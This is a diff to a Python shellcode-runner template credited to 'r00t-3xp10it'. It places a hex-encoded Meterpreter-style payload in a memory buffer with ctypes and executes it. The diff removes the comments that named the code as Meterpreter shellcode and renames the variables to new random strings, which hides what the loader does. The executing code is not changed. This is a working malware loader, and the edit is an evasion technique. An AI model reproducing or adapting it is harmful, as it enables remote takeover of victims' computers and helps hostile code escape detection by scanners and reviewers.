@@ -1,16 +1,11 @@
 # python  template | Author: r00t-3xp10it
-# execute shellcode into memory (ram)
-# ---
-# paste the generated shellcode (chars.raw) in
-# 'shellcode =(' funtion replacing the
-# existing shellcode by our own...
 # ---
 
 
 from ctypes import *
 
-# Our Meterpreter (shellcode) code goes here
-rGdGjDfJdK = ("\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
+# Our code goes here
+rHfGjdSiJdK = ("\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
 "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
 "\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
 "\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
@@ -21,7 +16,7 @@ rGdGjDfJdK = ("\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
 "\x53\xff\xd5");
 
 
-# Push Meterpreter (shellcode) into memory
-eEiJgKrDe = create_string_buffer(rGdGjDfJdK, len(rGdGjDfJdK))
-KaSiSEdDR = cast(eEiJgKrDe, CFUNCTYPE(c_void_p))
-KaSiSEdDR()
+# Push into memory
+dEiTgKJDe = create_string_buffer(rHfGjdSiJdK, len(rHfGjdSiJdK))
+iKaiRSdDk = cast(dEiTgKJDe, CFUNCTYPE(c_void_p))
+iKaiRSdDk()
